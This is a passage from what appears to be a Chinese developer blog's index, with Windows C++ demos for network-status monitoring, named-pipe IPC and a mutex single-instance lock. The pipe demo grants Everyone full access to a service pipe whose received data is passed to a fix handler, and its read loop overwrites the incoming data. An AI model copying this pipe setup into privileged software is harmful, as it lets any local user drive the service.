&quot;GetNetworkConnections error : &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return result; &#125; if (enumConnectons) &#123; ULONG lFetch; INetworkConnection* connection = nullptr; while (SUCCEEDED(enumConnectons-&gt;Next(1, &amp;connection, &amp;lFetch)) &amp;&amp; nullptr != connection) &#123; // 判断是否当前连接网卡 /* VARIANT_BOOL isConnectInternet = VARIANT_FALSE; connection-&gt;get_IsConnectedToInternet(&amp;isConnectInternet); if (isConnectInternet == VARIANT_FALSE) &#123; continue; &#125; */ ConnectionInfo item; GUID guid; INetwork* network; BSTR strNetWorkName = nullptr; if (SUCCEEDED(connection-&gt;GetNetwork(&amp;network)) &amp;&amp; network != nullptr) &#123; network-&gt;GetName(&amp;strNetWorkName); &#125; std::string strName = _com_util::ConvertBSTRToString(strNetWorkName); if (strName.compare(&quot;TrustAgent VNIC&quot;) != 0) &#123; continue; &#125; // 获取 GUID connection-&gt;GetAdapterId(&amp;guid); item.guid = GUIDToString(guid); result.push_back(item); &#125; if (connection) &#123; connection-&gt;Release(); &#125; &#125; for (auto it = result.begin(); it != result.end(); ++it) &#123; it-&gt;type = GetNetAdpaterType(it-&gt;guid); &#125; std::partition(result.begin(), std::partition(result.begin(), result.end(), [](const ConnectionInfo&amp; info) &#123; return info.type != NetworkType::NotNetwork; &#125;), [](const ConnectionInfo&amp; info) &#123; return info.type == NetworkType::Ethernet; &#125;); for (auto it = result.begin(); it != result.end(); ++it) &#123; std::wcout &lt;&lt; &quot;connect network guid : &quot; &lt;&lt; it-&gt;guid &lt;&lt; &quot; | type : &quot; &lt;&lt; it-&gt;type &lt;&lt; std::endl; &#125; return result;&#125;NetworkType NetworkMonitor::GetNetAdpaterType(const std::wstring&amp; guid)&#123; unsigned long unSize = sizeof(IP_ADAPTER_INFO); std::unique_ptr&lt;uint8_t[]&gt; data = std::make_unique&lt;uint8_t[]&gt;(unSize); bool find = false; unsigned long unResult = GetAdaptersInfo(reinterpret_cast&lt;PIP_ADAPTER_INFO&gt;(data.get()), &amp;unSize); if (ERROR_BUFFER_OVERFLOW == unResult) &#123; data = std::make_unique&lt;uint8_t[]&gt;(unSize); unResult = GetAdaptersInfo(reinterpret_cast&lt;PIP_ADAPTER_INFO&gt;(data.get()), &amp;unSize); &#125; if (ERROR_SUCCESS == unResult) &#123; PIP_ADAPTER_INFO pIpAdapterInfo = reinterpret_cast&lt;PIP_ADAPTER_INFO&gt;(data.get()); while (pIpAdapterInfo) &#123; if (UnicodeToUTF8(guid) == pIpAdapterInfo-&gt;AdapterName) &#123; return MIB_IF_TYPE_ETHERNET == pIpAdapterInfo-&gt;Type ? NetworkType::Ethernet : IF_TYPE_IEEE80211 == pIpAdapterInfo-&gt;Type ? NetworkType::Wlan : NetworkType::NotNetwork; &#125; pIpAdapterInfo = pIpAdapterInfo-&gt;Next; &#125; &#125; return NetworkType::NotNetwork;&#125;void NetworkMonitor::OnNetworkStatusChange()&#123; ShowNetworkStatus();&#125;WiFiQuality NetworkMonitor::GetWiFiSignalQuality(const std::wstring&amp; guid)&#123; WiFiQuality result = WiFiQuality::Weak; DWORD dwMaxClient = 2; DWORD dwCurVersion = 0; DWORD dwResult = 0; unsigned int i, j; PWLAN_INTERFACE_INFO_LIST pIfList = NULL; PWLAN_INTERFACE_INFO pIfInfo = NULL; PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL; PWLAN_AVAILABLE_NETWORK pBssEntry = NULL; int iRSSI = 0; if (_wlanHandle == NULL) &#123; dwResult = WlanOpenHandle(dwMaxClient, NULL, &amp;dwCurVersion, &amp;_wlanHandle); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanOpenHandle failed with error: &quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; dwResult = WlanRegisterNotification(_wlanHandle, WLAN_NOTIFICATION_SOURCE_ALL, TRUE, WLAN_NOTIFICATION_CALLBACK(OnNotificationCallback), NULL, NULL, NULL); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanRegisterNotification failed with error: &quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; &#125; dwResult = WlanEnumInterfaces(_wlanHandle, NULL, &amp;pIfList); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanEnumInterfaces failed with error: &quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; for (i = 0; i &lt; (int)pIfList-&gt;dwNumberOfItems; i++) &#123; pIfInfo = (WLAN_INTERFACE_INFO*)&amp;pIfList-&gt;InterfaceInfo[i]; if (guid != GUIDToString(pIfInfo-&gt;InterfaceGuid) || pIfInfo-&gt;isState != wlan_interface_state_connected) &#123; continue; &#125; dwResult = WlanGetAvailableNetworkList(_wlanHandle, &amp;pIfInfo-&gt;InterfaceGuid, 0, NULL, &amp;pBssList); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanGetAvailableNetworkList failed with error:&quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; for (j = 0; j &lt; pBssList-&gt;dwNumberOfItems; j++) &#123; pBssEntry = (WLAN_AVAILABLE_NETWORK*)&amp;pBssList-&gt;Network[j]; if (pBssEntry-&gt;bNetworkConnectable &amp;&amp; (pBssEntry-&gt;dwFlags &amp; WLAN_AVAILABLE_NETWORK_CONNECTED)) &#123; if (pBssEntry-&gt;wlanSignalQuality == 0) iRSSI = -100; else if (pBssEntry-&gt;wlanSignalQuality == 100) iRSSI = -50; else iRSSI = -100 + (pBssEntry-&gt;wlanSignalQuality / 2); std::cout &lt;&lt; &quot;Signal Quality:\\t &quot; &lt;&lt; pBssEntry-&gt;wlanSignalQuality &lt;&lt; &quot; (RSSI: &quot; &lt;&lt; iRSSI &lt;&lt; &quot; dBm)&quot; &lt;&lt; std::endl; result = iRSSI &lt; -70 ? WiFiQuality::Weak : iRSSI &lt; -60 ? WiFiQuality::Fair : iRSSI &lt; -50 ? WiFiQuality::Good : WiFiQuality::Excellent; &#125; &#125; &#125; if (pBssList != NULL) &#123; WlanFreeMemory(pBssList); pBssList = NULL; &#125; if (pIfList != NULL) &#123; WlanFreeMemory(pIfList); pIfList = NULL; &#125; return result;&#125;void NetworkMonitor::OnWiFiQualityChange(const GUID&amp; guid)&#123; auto nowQuality = GetWiFiSignalQuality(GUIDToString(guid)); std::cout &lt;&lt; &quot;WiFi signal quality now : &quot; &lt;&lt; nowQuality &lt;&lt; std::endl; ShowNetworkStatus();&#125;void NetworkMonitor::ShowNetworkStatus()&#123; NetworkType type; WiFiQuality quality; auto connections = GetNetworkConnections(); if (connections.empty()) &#123; type = NetworkType::NotNetwork; &#125; else &#123; type = connections.front().type; if (type == NetworkType::Wlan) &#123; quality = GetWiFiSignalQuality(connections.front().guid); &#125; &#125; std::cout &lt;&lt; &quot;====== Notify ======&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;* Type : &quot; &lt;&lt; (type == NetworkType::NotNetwork ? &quot;NetworkError&quot; : type == NetworkType::Ethernet ? &quot;Ethernet&quot; : &quot;WiFi&quot;) &lt;&lt; std::endl; if (type == NetworkType::Wlan) &#123; std::cout &lt;&lt; &quot;* Signal : &quot; &lt;&lt; quality + 1 &lt;&lt; std::endl; &#125; std::cout &lt;&lt; std::endl;&#125;int main()&#123; InstanceOfNetworkMonitor()-&gt;ShowNetworkStatus(); while (true) std::this_thread::sleep_for(std::chrono::hours(10)); return 0;&#125; 使用示例2 监控网络连接状态 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#include &lt;netlistmgr.h&gt;#include &quot;sp_log.h&quot;#include &lt;atomic&gt;#include &lt;thread&gt;#include &lt;mutex&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;netcon.h&gt;#include &lt;Shlwapi.h&gt;#include &lt;TLHELP32.H&gt;#include &lt;UserEnv.h&gt;#include &lt;iphlpapi.h&gt;#pragma comment(lib,&quot;shlwapi.lib&quot;)#pragma comment(lib,&quot;Iphlpapi.lib&quot;)class CNetworkListManagerEvent : public INetworkListManagerEvents&#123;public: CNetworkListManagerEvent(std::function&lt;void(bool)&gt; netChangedHandler) : m_ref(1) , netChangedHandler_(netChangedHandler) &#123; &#125; ~CNetworkListManagerEvent() &#123; &#125; HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) &#123; HRESULT Result = S_OK; if (IsEqualIID(riid, IID_IUnknown)) &#123; *ppvObject = (IUnknown*)this; &#125; else if (IsEqualIID(riid, IID_INetworkListManagerEvents)) &#123; *ppvObject = (INetworkListManagerEvents*)this; &#125; else &#123; Result = E_NOINTERFACE; &#125; return Result; &#125; ULONG STDMETHODCALLTYPE AddRef() &#123; return (ULONG)InterlockedIncrement(&amp;m_ref); &#125; ULONG STDMETHODCALLTYPE Release() &#123; LONG Result = InterlockedDecrement(&amp;m_ref); if (Result == 0) delete this; return (ULONG)Result; &#125; virtual HRESULT STDMETHODCALLTYPE ConnectivityChanged( /* [in] */ NLM_CONNECTIVITY newConnectivity) &#123; if (newConnectivity == NLM_CONNECTIVITY_DISCONNECTED) &#123; SP_DEV_LOGT(&quot;internet status changed. connect closed&quot;); // 网络断开 netChangedHandler_(false); &#125; else if ((newConnectivity &amp; NLM_CONNECTIVITY_IPV4_INTERNET) || (newConnectivity &amp; NLM_CONNECTIVITY_IPV6_INTERNET)) &#123; SP_DEV_LOGT(&quot;internet status changed. connect success&quot;); // 网络连接成功 netChangedHandler_(true); &#125; return S_OK; &#125;private: LONG m_ref; std::function&lt;void(bool)&gt; netChangedHandler_;&#125;;class CNetworkMonitor&#123;public: CNetworkMonitor() &#123;&#125;; ~CNetworkMonitor() &#123;&#125;;private: // 监控网络状态变化 static void InitNetworkMonitor() &#123; SP_DEV_LOGT(&quot;InitNetworkMonitor&quot;); bool bSuccess = false; CoInitialize(NULL); // // 通过NLA接口获取网络状态 // IUnknown* pUnknown = NULL; HRESULT Result = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&amp;pUnknown); if (SUCCEEDED(Result)) &#123; INetworkListManager* pNetworkListManager = NULL; Result = pUnknown-&gt;QueryInterface(IID_INetworkListManager, (void**)&amp;pNetworkListManager); if (SUCCEEDED(Result)) &#123; VARIANT_BOOL IsConnect = VARIANT_FALSE; Result = pNetworkListManager-&gt;get_IsConnectedToInternet(&amp;IsConnect); if (SUCCEEDED(Result)) &#123; printf(&quot;connect to internet:%s&quot;, IsConnect == VARIANT_TRUE ? &quot;TRUE&quot; : &quot;FALSE&quot;); &#125; IConnectionPointContainer* pCPContainer = NULL; Result = pNetworkListManager-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;pCPContainer); if (SUCCEEDED(Result)) &#123; IConnectionPoint* pConnectPoint = NULL; Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint); if (SUCCEEDED(Result)) &#123; DWORD Cookie = NULL; CNetworkMonitor networkMonitor; std::function&lt;void(bool)&gt; monitorFunc = std::bind(&amp;CNetworkMonitor::NetworkStatusChangedCallback, networkMonitor, std::placeholders::_1); CNetworkListManagerEvent* pNetEvent = new(std::nothrow) CNetworkListManagerEvent(monitorFunc); if (pNetEvent) &#123; Result = pConnectPoint-&gt;Advise((IUnknown*)pNetEvent, &amp;Cookie); if (SUCCEEDED(Result)) &#123; printf(&quot;InitNetworkMonitor success&quot;); bSuccess = true; MSG msg; while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); if (msg.message == WM_QUIT) &#123; break; &#125; &#125; pConnectPoint-&gt;Unadvise(Cookie); pConnectPoint-&gt;Release(); &#125; &#125; &#125; pCPContainer-&gt;Release(); &#125; pNetworkListManager-&gt;Release(); &#125; pUnknown-&gt;Release(); &#125; CoUninitialize(); &#125; void NetworkStatusChangedCallback(bool status) &#123; g_bNetWorkOnline = status; if (status) &#123; if (g_sp_trust_model.get()) &#123; if (g_sp_trust_model-&gt;IsOnline()) &#123; //休眠唤醒后网络连接成功，自动发送一次心跳 printf(&quot;Sleep wakes up and automatically triggers a heartbeat&quot;); &#125; else &#123; printf(&quot;No login, will not rebuild trust nc&quot;); &#125; &#125; else &#123; printf(&quot;rebuild trust nc - g_sp_trust_model is null&quot;); &#125; &#125; &#125;public: void StartMonitor() &#123; std::thread monitorThread(&amp;InitNetworkMonitor); monitorThread.detach(); &#125;&#125;;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】管道demo","date":"2023-10-27T01:24:02.069Z","path":"A_OS/Windows/【win】管道的使用/","text":"概述：Windows 管道创建与使用 [toc] 管道类.h123456789101112131415161718192021222324252627282930313233343536373839#pragma once#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;memory&gt;#define TIME_ASECOND 1000enum PIPEUSERTYPE &#123; USER_CLIENT, //客户端 USER_SERVER, //服务端&#125;;class PipeIPC &#123;public: explicit PipeIPC(PIPEUSERTYPE role) :m_Role(role), m_hPipeHandle(INVALID_HANDLE_VALUE) &#123;&#125;; ~PipeIPC(); bool WriteData(__in const std::string&amp; datas); //写入数据 void Release(); bool ReadData(__out std::string&amp; datas, __out bool bIsPipeEnd); //读取数据 bool InitPipeIPC(); //初始化管道通信 bool IsInit(); BOOL InitSecurityAttributes(); void Connect(); void DisConnect();private: PIPEUSERTYPE m_Role; HANDLE m_hPipeHandle; SECURITY_ATTRIBUTES m_sec_attr; //security attributes &#125;; .cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#include &quot;PipeIPC.h&quot;#include &lt;AccCtrl.h&gt;#include &lt;AclAPI.h&gt;using namespace std;#define PIPE_SERVER_NAME &quot;\\\\\\\\.\\\\pipe\\\\TrustAgent\\\\pipe.ToFixService&quot;#define PIPE_CLIENT_NAME &quot;\\\\\\\\.\\\\pipe\\\\TrustAgent\\\\pipe.ToTrustAgent&quot;PipeIPC::~PipeIPC()&#123; if (m_hPipeHandle != INVALID_HANDLE_VALUE) &#123; DisconnectNamedPipe(m_hPipeHandle); CloseHandle(m_hPipeHandle); &#125;&#125;bool PipeIPC::InitPipeIPC()&#123; if (USER_SERVER == m_Role &amp;&amp; nullptr != m_hPipeHandle) &#123; InitSecurityAttributes(); // cout &lt;&lt; &quot;ser&quot; &lt;&lt; endl; m_hPipeHandle = CreateNamedPipeA(PIPE_SERVER_NAME, PIPE_ACCESS_DUPLEX, //双向模式 PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE/* | PIPE_NOWAIT*/, PIPE_UNLIMITED_INSTANCES,//设置最大容纳实例数目 0, 0, NULL, (LPSECURITY_ATTRIBUTES)&amp;m_sec_attr); //如果管道创建失败 if (m_hPipeHandle == INVALID_HANDLE_VALUE) &#123; return false; &#125;#if 0 if (!ConnectNamedPipe(m_hPipeHandle, nullptr)) &#123; cout &lt;&lt; &quot;ConnectNamedPipe failed&quot; &lt;&lt; endl; return false; &#125;#endif &#125; else &#123; if (WaitNamedPipeA(PIPE_CLIENT_NAME, TIME_ASECOND * 5) == FALSE) return 0; m_hPipeHandle = CreateFileA( PIPE_CLIENT_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //如果管道创建失败 if (m_hPipeHandle == INVALID_HANDLE_VALUE) &#123; return false; &#125; WriteData(&quot;[PIPE] ------ V10 Init ------&quot;); &#125; return true;&#125;bool PipeIPC::IsInit()&#123; return m_hPipeHandle == INVALID_HANDLE_VALUE ? false : true;&#125;/* [details] 创建管道去管理员权限*/BOOL PipeIPC::InitSecurityAttributes()&#123; PSID pEveryoneSID = NULL; PACL pACL = NULL; EXPLICIT_ACCESS ea; PSECURITY_DESCRIPTOR pSD = NULL; void* ea_addr = NULL; void* acl_addr = NULL; void* sd_addr = NULL; SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY; if (!AllocateAndInitializeSid(&amp;SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &amp;pEveryoneSID)) &#123; return FALSE; &#125; ZeroMemory(&amp;ea, sizeof(EXPLICIT_ACCESS)); ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL; ea.grfAccessMode = SET_ACCESS; ea.grfInheritance = NO_INHERITANCE; ea.Trustee.TrusteeForm = TRUSTEE_IS_SID; ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP; ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID; ea_addr = &amp;ea; if (ERROR_SUCCESS != SetEntriesInAcl(1, &amp;ea, NULL, &amp;pACL)) &#123; goto cleanup; &#125; acl_addr = &amp;pACL; pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH); if (NULL == pSD) &#123; goto cleanup; &#125; if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) &#123; goto cleanup; &#125; sd_addr = &amp;pSD; if (!SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE)) &#123; goto cleanup; &#125; m_sec_attr.nLength = sizeof(SECURITY_ATTRIBUTES); m_sec_attr.lpSecurityDescriptor = pSD; m_sec_attr.bInheritHandle = FALSE; return TRUE;cleanup: if (pEveryoneSID) FreeSid(pEveryoneSID); if (pACL) LocalFree(pACL); if (pSD) LocalFree(pSD); return FALSE;&#125;void PipeIPC::Connect()&#123; ConnectNamedPipe(m_hPipeHandle, nullptr);&#125;void PipeIPC::DisConnect()&#123; DisconnectNamedPipe(m_hPipeHandle);&#125;//读取数据bool PipeIPC::ReadData(__out std::string&amp; datas, __out bool bIsPipeEnd)&#123; if (INVALID_HANDLE_VALUE == m_hPipeHandle || nullptr == m_hPipeHandle) &#123; InitPipeIPC(); &#125; DWORD cbRead = 0;//定义数据长度 DWORD cbData = 0; if (ReadFile(m_hPipeHandle, &amp;cbData, sizeof(cbData), &amp;cbRead, nullptr) &amp;&amp; sizeof(cbData) == cbRead) &#123; DWORD error = GetLastError(); bIsPipeEnd = (error == ERROR_BROKEN_PIPE ? true : false); datas.resize(cbData); if (ReadFile(m_hPipeHandle, (LPVOID)datas.data(), cbData, &amp;cbRead, nullptr) &amp;&amp; cbData == cbRead) &#123; return true; &#125; &#125; else &#123; DWORD dwError = GetLastError(); bIsPipeEnd = (dwError == ERROR_BROKEN_PIPE) ? true : false; &#125; datas.resize(0); return false;&#125;//写入数据bool PipeIPC::WriteData(__in const std::string&amp; datas)&#123; if (m_Role == USER_SERVER) &#123; bool connect = ConnectNamedPipe(m_hPipeHandle, NULL); if (!connect) &#123; if (!InitPipeIPC()) &#123; DWORD error = GetLastError(); if (error != ERROR_PIPE_CONNECTED) &#123; //cout &lt;&lt; &quot;客户端还没连接&quot; &lt;&lt; endl; //连接失败 return false; &#125; &#125; &#125; &#125; if (!IsInit()) &#123; if (!InitPipeIPC()) &#123; return false; &#125; &#125; //连接成功！ DWORD wLen; const DWORD cbData = datas.size() * sizeof(datas[0]); if (!WriteFile(m_hPipeHandle, &amp;cbData, sizeof(cbData), &amp;wLen, NULL)) &#123; return false; &#125; if (!WriteFile(m_hPipeHandle, datas.c_str(), datas.size() * sizeof(datas[0]), &amp;wLen, NULL)) &#123; return false; &#125; return true;&#125;void PipeIPC::Release()&#123; if (m_hPipeHandle) &#123; DisconnectNamedPipe(m_hPipeHandle); CloseHandle(m_hPipeHandle); // 关闭句柄 m_hPipeHandle = NULL; &#125;&#125; 定义与声明12__declspec(selectany) PipeIPC* pRead = new PipeIPC(USER_SERVER);__declspec(selectany) PipeIPC* pWrite = new PipeIPC(USER_CLIENT); 使用监听管道 随程序同时启动 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 BOOL StartPipeRead()&#123; EventLog(LOG_ALL, &quot;[IPC][THREAD] ,Create PipeReadThread Success, pipe = %p&quot;, pRead ); EventLog(LOG_ALL, &quot;pipe = %p, pipe-&gt;IsInit()=%d&quot;, pRead, pRead-&gt;IsInit()); bool isPipeEnd = true; while (true) &#123; if (isPipeEnd) &#123; pRead-&gt;Connect(); &#125; std::string datas; if (!pRead-&gt;ReadData(datas, isPipeEnd)) &#123; if (isPipeEnd) &#123; EventLog(LOG_ALL, &quot;-----------[PIPE END]----------&quot;); pRead-&gt;DisConnect(); &#125; &#125; datas = &quot;Add&quot;; // 数据处理 if (datas.find(&quot;start&quot;) != std::string::npos) // 启动成功 &#123; EventLog(LOG_ALL, &quot; [PIPE] [REC] TrustAgentStart&quot;); // 启动 管道客户端 if (!StartPipeWrite()) &#123; EventLog(LOG_ALL, &quot; [PIPE] Failed to Create Client Pipe, GetLastError()=&quot;, GetLastError()); &#125; &#125; else if (!datas.empty()) &#123; EventLog(LOG_ALL, &quot;[PIPE] [RECV] datas: %s&quot;, datas.c_str()); // 调用导出的接口 &#123; std::thread th(HandleFix, datas); th.detach(); &#125; // NSPTRUST::SendRpcMsgToPlugin(POLICY_SENDTQA_USER, datas.c_str()); &#125; &#125;&#125; 写管道启动时机，同名管道的监听管道启动后再启动 1234567BOOL StartPipeWrite()&#123; if (pWrite-&gt;IsInit()) return true; else return pWrite-&gt;InitPipeIPC();&#125; 写数据 12std::string datas = &quot;Send data to PIPE Read&quot;;pWrite-&gt;WriteData(datas);","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"系统锁","date":"2023-10-27T01:24:02.069Z","path":"A_OS/Windows/【win】系统锁/","text":"概述：系统锁就是在创建句柄，再次创建该句柄时，会返回失败 [toc] 系统锁系统锁就是使用 CreateMutexA 创建一个句柄，创建成功时，句柄不为空。当再次使用该锁的命名创建时，因为已经创建了一个同名锁了，所以会报错，也就实现了进程启动一次或者函数执行一次的逻辑。 代码12345678910111213141516171819202122class WinSingleleton &#123;public: WinSingleleton(string name); ~WinSingleleton() &#123; if (_handle != INVALID_HANDLE_VALUE) &#123; CloseHandle(_handle); &#125; _handle = INVALID_HANDLE_VALUE; &#125;private: HANDLE _handle;&#125;;WinSingleleton::WinSingleleton(string name) :_handle(INVALID_HANDLE_VALUE)&#123; _handle = CreateMutexA(NULL, FALSE, name.c_str());&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"锁","slug":"锁","permalink":"http://example.com/tags/%E9%94%81/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Windows】监控系统事件（网卡）","date":"2023-10-27T01:24:02.068Z","path":"A_OS/Windows/【win】监控系统事件/","text":"概述：监控系统事件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202#pragma once#include &lt;netlistmgr.h&gt;#include &lt;atomic&gt;std::atomic_bool g_bNetWorkOnline(true);class CNetworkListManagerEvent : public INetworkListManagerEvents&#123;public: CNetworkListManagerEvent(std::function&lt;void(bool)&gt; netChangedHandler) : m_ref(1) , netChangedHandler_(netChangedHandler) &#123; &#125; ~CNetworkListManagerEvent() &#123; &#125; HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) &#123; HRESULT Result = S_OK; if (IsEqualIID(riid, IID_IUnknown)) &#123; *ppvObject = (IUnknown*)this; &#125; else if (IsEqualIID(riid, IID_INetworkListManagerEvents)) &#123; *ppvObject = (INetworkListManagerEvents*)this; &#125; else &#123; Result = E_NOINTERFACE; &#125; return Result; &#125; ULONG STDMETHODCALLTYPE AddRef() &#123; return (ULONG)InterlockedIncrement(&amp;m_ref); &#125; ULONG STDMETHODCALLTYPE Release() &#123; LONG Result = InterlockedDecrement(&amp;m_ref); if (Result == 0) delete this; return (ULONG)Result; &#125; virtual HRESULT STDMETHODCALLTYPE ConnectivityChanged( /* [in] */ NLM_CONNECTIVITY newConnectivity) &#123; if (newConnectivity == NLM_CONNECTIVITY_DISCONNECTED) &#123; SP_DEV_LOGT(&quot;internet status changed. connect closed&quot;); // 网络断开 netChangedHandler_(false); &#125; else if ((newConnectivity &amp; NLM_CONNECTIVITY_IPV4_INTERNET) || (newConnectivity &amp; NLM_CONNECTIVITY_IPV6_INTERNET)) &#123; SP_DEV_LOGT(&quot;internet status changed. connect success&quot;); // 网络连接成功 netChangedHandler_(true); &#125; return S_OK; &#125;private: LONG m_ref; std::function&lt;void(bool)&gt; netChangedHandler_;&#125;;class CNetworkMonitor&#123;public: CNetworkMonitor() &#123;&#125;; ~CNetworkMonitor() &#123;&#125;;private: // 监控网络状态变化 static void InitNetworkMonitor() &#123; SP_DEV_LOGT(&quot;InitNetworkMonitor&quot;); bool bSuccess = false; CoInitialize(NULL); // // 通过NLA接口获取网络状态 // IUnknown* pUnknown = NULL; HRESULT Result = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&amp;pUnknown); if (SUCCEEDED(Result)) &#123; INetworkListManager* pNetworkListManager = NULL; Result = pUnknown-&gt;QueryInterface(IID_INetworkListManager, (void**)&amp;pNetworkListManager); if (SUCCEEDED(Result)) &#123; VARIANT_BOOL IsConnect = VARIANT_FALSE; Result = pNetworkListManager-&gt;get_IsConnectedToInternet(&amp;IsConnect); if (SUCCEEDED(Result)) &#123; SP_DEV_LOGT(&quot;connect to internet:%s&quot;, IsConnect == VARIANT_TRUE ? &quot;TRUE&quot; : &quot;FALSE&quot;); &#125; IConnectionPointContainer* pCPContainer = NULL; Result = pNetworkListManager-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;pCPContainer); if (SUCCEEDED(Result)) &#123; IConnectionPoint* pConnectPoint = NULL; Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint); if (SUCCEEDED(Result)) &#123; DWORD Cookie = NULL; CNetworkMonitor networkMonitor; std::function&lt;void(bool)&gt; monitorFunc = std::bind(&amp;CNetworkMonitor::NetworkStatusChangedCallback, networkMonitor, std::placeholders::_1); CNetworkListManagerEvent* pNetEvent = new(std::nothrow) CNetworkListManagerEvent(monitorFunc); if (pNetEvent) &#123; Result = pConnectPoint-&gt;Advise((IUnknown*)pNetEvent, &amp;Cookie); if (SUCCEEDED(Result)) &#123; SP_DEV_LOGT(&quot;InitNetworkMonitor success&quot;); bSuccess = true; MSG msg; while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); if (msg.message == WM_QUIT) &#123; break; &#125; &#125; pConnectPoint-&gt;Unadvise(Cookie); pConnectPoint-&gt;Release(); &#125; &#125; &#125; pCPContainer-&gt;Release(); &#125; pNetworkListManager-&gt;Release(); &#125; pUnknown-&gt;Release(); &#125; CoUninitialize(); &#125; void NetworkStatusChangedCallback(bool status) &#123; g_bNetWorkOnline = status; if (status) &#123; if (g_sp_trust_model.get()) &#123; if (g_sp_trust_model-&gt;IsOnline()) &#123; //休眠唤醒后网络连接成功，自动发送一次心跳 SP_LOGI(&quot;Sleep wakes up and automatically triggers a heartbeat&quot;); g_sp_trust_model-&gt;OnWakeToSendHeartBeat(); SP_LOGI(&quot;rebuild trust nc&quot;); if (g_sp_trust_model-&gt;Session()-&gt;NeedsL3Tunnel() &amp;&amp; !g_sp_trust_model-&gt;Session()-&gt;IsTunnelSvrsEmpty()) &#123; // 网络连接成功后自动触发重连 std::thread buildUtunThread([] &#123; g_sp_trust_model-&gt;NotifyUpMessage(SP_TRUST_TOPIC_BUILD_UTUN, SPJSONObject()); &#125;); buildUtunThread.detach(); &#125; &#125; else &#123; SP_LOGI(&quot;No login, will not rebuild trust nc&quot;); &#125; &#125; else &#123; SP_LOGI(&quot;rebuild trust nc - g_sp_trust_model is null&quot;); &#125; &#125; &#125;public: void StartMonitor() &#123; std::thread monitorThread(&amp;InitNetworkMonitor); monitorThread.detach(); 